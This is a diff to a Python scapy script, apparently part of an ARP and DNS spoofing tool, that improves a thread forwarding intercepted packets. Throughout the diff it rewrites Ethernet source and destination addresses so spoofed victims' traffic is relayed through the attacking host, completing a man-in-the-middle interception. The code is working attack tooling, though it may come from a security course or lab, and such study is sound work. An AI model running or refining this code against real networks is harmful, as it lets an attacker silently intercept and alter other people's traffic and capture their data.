@@ -3,7 +3,7 @@ from scapy.layers.dns import DNSQR, DNS
 from scapy.layers.l2 import ARP, Ether
 from scapy.layers.inet import IP
 from scapy.sendrecv import sendp, sniff
-from scapy.arch import get_if_addr
+from scapy.arch import get_if_addr, get_if_hwaddr
 import threading
 
 
@@ -22,6 +22,7 @@ class Forwarding(threading.Thread):
         self.hosts = hosts
         self.domain_names = domain_names
         self.host_ip = get_if_addr(interface)
+        self.host_mac = get_if_hwaddr(interface)
         self._stop = threading.Event()
 
     def stop(self):
@@ -36,7 +37,7 @@ class Forwarding(threading.Thread):
             # Get correct (non-spoofed) mac address corresponding to the IP of the received packet
             for mac in self.hosts[self.interface]:
                 for ip in self.hosts[self.interface][mac]:
-                    if ip == received_packet[ARP].pdst:
+                    if ip == ip_addr:
                         return mac
 
         def forward(received_packet: packet) -> None:
@@ -59,18 +60,18 @@ class Forwarding(threading.Thread):
                         correct_mac = get_original_mac(received_packet[IP].dst)
                     else:
                         print("Failed to forward packet")
-                        received_packet.show()
+                        return
 
+                    received_packet[Ether].src = self.host_mac
                     received_packet[Ether].dst = correct_mac
-
+                try:
                     sendp(received_packet, iface=self.interface, verbose=False)
-                else:
-                    print("Packet without Ether received:")
-                    received_packet.show()
+                except Exception as e:
+                    print(e)
 
         print("Now forwarding spoofed ARP and DNS packets...")
         while True:
             if self.is_stopped():
                 print("Stopped forwarding spoofed ARP and DNS packets")
                 return
-            sniff(iface=self.interface, prn=forward, store=0, timeout=1)
+            sniff(iface=self.interface, prn=forward, filter="ip", store=0, timeout=1)
